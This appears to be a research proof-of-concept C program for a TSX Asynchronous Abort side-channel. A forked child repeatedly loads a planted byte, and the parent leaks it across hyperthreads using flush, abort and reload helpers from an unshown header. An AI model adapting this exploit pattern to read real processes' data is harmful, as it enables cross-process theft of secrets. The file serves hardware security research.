/*
Leak a cross-thread read using TSX cache-conflict aborts.

Notes:

Expected output:
$ taskset -c 3,7 ./taa_read
00009589: 89 (?)

*/
#define ITERS 10000

#include "ridl.h"

int main(int argc, char *argv[]) {
	pid_t pid = fork();
	if (pid == 0) {
		asm volatile ("movq $0x89, -0x10(%rsp)\n");
		while (1)
			asm volatile(
				"mov -0x10(%rsp), %al\n");
	}
	if (pid < 0) return 1;

	ALLOC_BUFFERS();

	memset(results, 0, sizeof(results));

	for (size_t i = 0; i < ITERS; ++i) {
		flush(reloadbuffer);
		tsxabort_leak_bareconflict(leak, reloadbuffer, reloadbuffer);
		reload(reloadbuffer, results);
	}

	print_results(results);
	kill(pid, SIGKILL);
}

